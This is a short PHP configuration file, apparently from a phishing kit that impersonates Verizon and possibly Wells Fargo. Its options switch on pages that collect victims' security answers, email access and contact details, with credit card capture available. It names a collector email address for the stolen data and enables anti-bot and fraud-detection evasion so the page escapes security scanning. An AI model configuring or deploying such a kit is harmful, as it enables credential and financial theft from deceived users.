<?php

$double_login = "no";
$double_access = "yes";

$show_question = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "no";
$show_success_page = "yes";

$your_email = "caliroken@protonmail.com"; // Your Fucking Email Here bro !! 
$redirect = "https://www.verizon.com"; // you can change this 

$redirection = "no";     			   // If you won't to Use Redirection Like { Domain.com?id=wells } Make it Yes .
$api_protection = "yes";  			   // This Api For detect Frauds And Bad Bot fROM IP .
$Key = "1T1hE9XTKxb4yVBcwAgpN79sbAGvckiF"; // Your Key api protection DON't CHANGE IT BRO ...
$anti_bot = "yes";


?>